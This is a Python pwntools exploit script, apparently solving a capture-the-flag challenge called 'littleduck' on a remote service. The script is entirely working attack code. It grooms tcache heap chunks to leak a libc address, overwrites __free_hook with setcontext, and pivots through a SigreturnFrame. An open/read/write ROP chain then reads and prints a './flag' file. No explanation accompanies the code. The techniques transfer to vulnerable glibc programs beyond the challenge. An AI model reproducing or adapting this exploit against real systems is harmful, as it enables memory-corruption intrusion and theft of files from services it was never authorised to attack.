#!/usr/bin/env python
#coding=utf-8


from pwn import*

#io = process('./littleduck')
io = remote("172.16.30.216",58011)
elf = ELF('./littleduck')
libc = ELF('./libc.so.6')
context(log_level='debug',os='linux',arch='amd64')



def choice(c):
    io.recvuntil(":")
    io.sendline(str(c))

def add():
    choice(1)


def show(index):
    choice(3)
    io.recvuntil(":")
    io.sendline(str(index))

def edit(index,content):
    choice(4)
    io.recvuntil(":")
    io.sendline(str(index))
    io.recvuntil(":")
    io.sendline(str(0xf8))
    io.recvuntil(":")
    io.send(content)

def free(index):
    choice(2)
    io.recvuntil(":")
    io.sendline(str(index))



add()
add()
add()

for i in range(7):
    add()

for i in range(3,10):
    free(i)

free(0)
free(1)
free(2)

for i in range(7):
    add()

add()
add()
add()

for i in range(7):
    free(i)

free(7)

for i in range(7):
    add()

free(8)

add()

for i in range(7):
    free(i)

edit(7,'A'*0xf8)
free(9)

for i in range(7):
    add()

add()
show(7)

leak = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc_base = leak - 96 - 0x10 - libc.sym['__malloc_hook']
system = libc_base + libc.sym['system']
setcontext = libc.sym['setcontext'] + libc_base +53
syscall = next(libc.search(asm("syscall\nret")))+libc_base
fh = libc_base + libc.sym['__free_hook']

success(hex(leak))
success(hex(libc_base))

add()

free(7)
edit(9,p64(fh))

add()
add()

edit(10,p64(setcontext))



frame = SigreturnFrame()
frame.rsp = (fh&0xfffffffffffff000)+8
frame.rax = 0
frame.rdi = 0
frame.rsi = fh&0xfffffffffffff000
frame.rdx = 0x2000
frame.rip = syscall

edit(9,bytes(frame)[0:0xf0])
free(9)

layout = [next(libc.search(asm('pop rdi\nret')))+libc_base
    ,fh&0xfffffffffffff000
    ,next(libc.search(asm('pop rsi\nret')))+libc_base
    ,0
    ,next(libc.search(asm('pop rdx\nret')))+libc_base
    ,0
    ,next(libc.search(asm('pop rax\nret')))+libc_base
    ,2
    ,syscall
    ,next(libc.search(asm('pop rdi\nret')))+libc_base
    ,3
    ,next(libc.search(asm('pop rsi\nret')))+libc_base
    ,(fh&0xfffffffffffff000)+0x200
    ,next(libc.search(asm('pop rdx\nret')))+libc_base
    ,0x30
    ,next(libc.search(asm('pop rax\nret')))+libc_base
    ,0
    ,syscall
    ,next(libc.search(asm('pop rdi\nret')))+libc_base
    ,1
    ,next(libc.search(asm('pop rsi\nret')))+libc_base
    ,(fh&0xfffffffffffff000)+0x200
    ,next(libc.search(asm('pop rdx\nret')))+libc_base
    ,0x30
    ,next(libc.search(asm('pop rax\nret')))+libc_base
    ,1
    ,syscall]
shellcode=b'./flag'.ljust(8,b'\x00')+flat(layout)
io.sendline(shellcode)


io.interactive()